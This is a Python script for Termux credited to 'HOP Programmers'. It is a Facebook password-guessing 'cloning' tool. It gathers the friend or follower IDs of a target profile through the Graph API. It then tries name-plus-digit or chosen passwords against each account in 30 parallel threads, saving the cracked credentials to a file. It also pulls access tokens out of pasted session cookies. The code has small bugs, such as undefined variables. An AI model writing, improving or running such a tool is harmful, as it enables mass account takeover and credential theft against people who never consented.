import os
import sys
import time
import datetime
import re
import threading
import json
import random
import requests
import hashlib
import cookielib
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'HOP'
__copyright = 'All rights reserved . Copyright  H.O.P'
os.system('termux-setup-storage')

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')
logo = '\n\n  ##     ##     #######     ########  \n  ##     ##    ##     ##    ##     ## \n  ##     ##    ##     ##    ##     ## \n  #########    ##     ##    ########  \n  ##     ##    ##     ##    ##        \n  ##     ##    ##     ##    ##        \n  ##     ##     #######     ##        \n\n ------------------------------------------\n   \n   Author   : Muhammad Hamza\n   Github   : https://github.com/Hamzahash\n   Telegram : https://t.me/hop1626\n   Facebook : Muhammad Hamza\n   Facebook Page : HOP Programmers\n   This tool is free . Not for sale\n   \n ------------------------------------------ '

def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print ' Your ip: ' + ips
    time.sleep(2)
    print ''
    print ' Your country: ' + country
    time.sleep(2)
    print ''
    print ' Your region: ' + regi
    time.sleep(2)
    print ''
    print ' Your network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    os.system('cd ..... && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    time.sleep(1)
    log_menu()


def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\tLogin menu'
        print ''
        print '[1] Login with FaceBook'
        print '[2] Login with token'
        print '[3] Login with cookies'
        print ''
        log_menu_s()



def log_menu_s():
    s = raw_input(' Choose option: ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\tLogin with id/pass'
    print ''
    lid = raw_input(' Id/mail/no: ')
    pwds = raw_input(' Password: ')
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
    q = json.loads(data)
    if 'loc' in q:
        ts = open('access_token.txt', 'w')
        ts.write(q['loc'])
        ts.close()
        menu()
    elif 'www.facebook.com' in q['error']:
        print ''
        print ' User must verify account before login'
        print ''
        raw_input(' Press enter to try again ')
        log_fb()
    else:
        print ''
        print ' Id/Pass may be wrong'
        print ''
        raw_input(' Press enter to try again ')
        log_fb()


def log_token():
    os.system('clear')
    print logo
    print ''
    print '\tLogin with token'
    print ''
    tok = raw_input(' Paste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\tLogin Cookies'
    print ''
    
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie }
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' Press enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' Press enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' Press enter to try again ')
        log_menu()



def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\t Login FB id to continue'
        print ''
        time.sleep(1)
        log_menu()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Logged in id has HOP_CP\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' Press enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    print ''
    print '  Logged in user: ' + z
    print ''
    print '  Active token: Free mode'
    print ''
    print ' ------------------------------------------ '
    print ''
    print '[1] Crack with auto pass'
    print '[2] Crack with choice pass'
    print '[3] View token'
    print '[4] Logout'
    print '[5] Remove trash files'
    print ''
    menu_s()


def menu_s():
    ms = raw_input(' Choose option: ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
    elif ms == '5':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def auto_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\tAuto pass cracking'
    print ''
    print '[1] Public id cloning'
    print '[2] Followers cloning'
    print '[B] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' Choose option: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\tAuto pass public cracking'
        print ''
        print ' For example: 123 , 1234 , 1234, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' Name + digit: ')
        p2 = raw_input(' Name + digit: ')
        p3 = raw_input(' Name + digit: ')
        p4 = raw_input(' Name + digit: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\tAuto pass public cracking'
            print ''
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\tAuto pass followers cracking'
        print ''
        print ' For example: 123 , 1234 , 1234, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' Name + digit: ')
        p2 = raw_input(' Name + digit: ')
        p3 = raw_input(' Name + digit: ')
        p4 = raw_input(' Name + digit: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\tAuto pass followers cracking'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' The process has started '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print ''
    print '\t\x1b[1;32mCreated by: HOP Programmers\x1b[0;97m'
    print ''
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[HOP_CP] ' + uid + ' | ' + pass1
                cp = open('HOP_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[HOP_CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[HOP_CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[HOP_CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    auto_crack()


def choice_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\tChoice pass cracking'
    print ''
    print '[1] Public id cloning'
    print '[2] Followers cloning'
    print '[B] Back'
    print ''
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' Choose option: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\t Choice pass public cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\t Choice pass public cracking'
            print ''
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\tChoice pass followers cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\tChoice pass followers cracking'
            print ''
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        print ''
        c_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' The process has started '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print ''
    print '\tCreated by: HOP Programmers'
    print ''
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[HOP_CP] ' + uid + ' | ' + pass1
                cp = open('HOP_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[HOP_CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[HOP_CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[HOP_OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[HOP_CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    choice_crack()

if __name__ == '__main__':
    ip()
